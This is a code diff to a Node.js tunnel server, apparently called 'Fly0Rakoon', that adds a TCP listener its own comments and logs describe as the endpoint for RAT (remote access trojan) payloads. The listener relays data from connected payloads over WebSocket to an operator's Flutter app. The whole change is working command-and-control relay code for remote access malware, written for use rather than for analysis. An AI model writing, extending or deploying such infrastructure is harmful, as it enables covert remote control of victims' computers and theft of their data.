@@ -1,6 +1,7 @@
 const express = require('express');
 const WebSocket = require('ws');
 const http = require('http');
+const net = require('net');
 const cors = require('cors');
 
 const app = express();
@@ -11,12 +12,15 @@ const wss = new WebSocket.Server({ server });
 const tunnels = new Map();
 const payloads = new Map();
 
+// TCP connections for RAT
+const tcpClients = new Map();
+
 app.use(cors());
 app.use(express.json());
 
-// Add request logger for debugging
+// Request logger for debugging
 app.use((req, res, next) => {
-    console.log(`[${new Date().toISOString()}] Request: ${req.method} ${req.url}`);
+    console.log(`[${new Date().toISOString()}] HTTP: ${req.method} ${req.url}`);
     next();
 });
 
@@ -27,16 +31,8 @@ app.get('/', (req, res) => {
         version: '1.0.0',
         tunnels: tunnels.size,
         payloads: payloads.size,
+        tcpClients: tcpClients.size,
         timestamp: new Date().toISOString()
-    });
-});
-
-// Catch-all for undefined routes
-app.use((req, res) => {
-    res.status(404).json({
-        status: 'error',
-        message: `Route ${req.method} ${req.url} not found`,
-        availableRoutes: ['GET /', 'GET /api/tunnel/:id', 'WebSocket /']
     });
 });
 
@@ -50,14 +46,94 @@ app.get('/api/tunnel/:id', (req, res) => {
     }
 });
 
-// WebSocket connection handler
+// Catch-all for undefined routes
+app.use((req, res) => {
+    res.status(404).json({
+        status: 'error',
+        message: `Route ${req.method} ${req.url} not found`,
+        availableRoutes: ['GET /', 'GET /api/tunnel/:id', 'WebSocket /', 'TCP on port 8081']
+    });
+});
+
+// ==================== TCP SERVER FOR RAT ====================
+const TCP_PORT = process.env.TCP_PORT || 8081;
+
+const tcpServer = net.createServer((socket) => {
+    const clientId = generateToken();
+    tcpClients.set(clientId, socket);
+    
+    console.log(`[${new Date().toISOString()}] 🔌 TCP connection from ${socket.remoteAddress}:${socket.remotePort} (ID: ${clientId})`);
+    
+    // Send welcome message
+    socket.write(`Welcome to Fly0Rakoon TCP Tunnel\nYour ID: ${clientId}\n\n`);
+    
+    socket.on('data', (data) => {
+        const message = data.toString().trim();
+        console.log(`[${new Date().toISOString()}] 📦 TCP data from ${clientId}: ${message.substring(0, 100)}`);
+        
+        // Check if it's a tunnel registration
+        if (message.startsWith('REGISTER:')) {
+            const tunnelId = message.split(':')[1];
+            const tunnel = tunnels.get(tunnelId);
+            if (tunnel) {
+                tunnel.tcpSocket = socket;
+                socket.write(`OK: Connected to tunnel ${tunnelId}\n`);
+                console.log(`✅ TCP client ${clientId} registered to tunnel ${tunnelId}`);
+            } else {
+                socket.write(`ERROR: Tunnel ${tunnelId} not found\n`);
+            }
+        }
+        // Forward to WebSocket if tunnel exists
+        else {
+            for (const [tunnelId, tunnel] of tunnels) {
+                if (tunnel.tcpSocket === socket && tunnel.ws) {
+                    tunnel.ws.send(JSON.stringify({
+                        type: 'tcp_data',
+                        data: message,
+                        clientId: clientId
+                    }));
+                }
+            }
+        }
+    });
+    
+    socket.on('end', () => {
+        console.log(`[${new Date().toISOString()}] 🔌 TCP client ${clientId} disconnected`);
+        tcpClients.delete(clientId);
+        
+        // Clean up tunnel references
+        for (const [tunnelId, tunnel] of tunnels) {
+            if (tunnel.tcpSocket === socket) {
+                delete tunnel.tcpSocket;
+                if (tunnel.ws) {
+                    tunnel.ws.send(JSON.stringify({
+                        type: 'tcp_disconnected',
+                        clientId: clientId
+                    }));
+                }
+                break;
+            }
+        }
+    });
+    
+    socket.on('error', (err) => {
+        console.log(`[${new Date().toISOString()}] ❌ TCP error: ${err.message}`);
+    });
+});
+
+tcpServer.listen(TCP_PORT, () => {
+    console.log(`🔌 TCP Server running on port ${TCP_PORT}`);
+    console.log(`   For RAT payloads: connect to port ${TCP_PORT}`);
+});
+
+// ==================== WEBSOCKET SERVER FOR FLUTTER APP ====================
 wss.on('connection', (ws, req) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const type = url.searchParams.get('type');
     const port = url.searchParams.get('port');
     const token = url.searchParams.get('token') || generateToken();
 
-    console.log(`[${new Date().toISOString()}] New connection: ${type}, port: ${port}`);
+    console.log(`[${new Date().toISOString()}] WebSocket connection: ${type}, port: ${port}`);
 
     if (type === 'app') {
         // App connection (your Flutter app)
@@ -73,13 +149,14 @@ wss.on('connection', (ws, req) => {
             type: 'registered',
             token: token,
             url: `https://${req.headers.host}/${token}`,
-            message: 'Tunnel created! Your payload can connect to this URL'
+            tcpPort: TCP_PORT,
+            message: 'Tunnel created! Your payload can connect via TCP or WebSocket'
         }));
 
         console.log(`✅ App tunnel created: ${token}`);
 
     } else if (type === 'payload') {
-        // Payload connection
+        // Payload connection (WebSocket)
         const tunnelToken = url.searchParams.get('tunnel');
         const tunnel = tunnels.get(tunnelToken);
 
@@ -160,10 +237,11 @@ function generateToken() {
     return Math.random().toString(36).substring(2, 15);
 }
 
-// Start server
-const PORT = process.env.PORT || 3000;
+// Start HTTP/WebSocket server
+const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log(`🚀 Railway Tunnel Server running on port ${PORT}`);
+    console.log(`🚀 HTTP/WebSocket Server running on port ${PORT}`);
     console.log(`📡 WebSocket endpoint: ws://localhost:${PORT}`);
     console.log(`🌐 HTTP endpoint: http://localhost:${PORT}`);
+    console.log(`🔌 TCP endpoint for RAT: tcp://localhost:${TCP_PORT}`);
 });
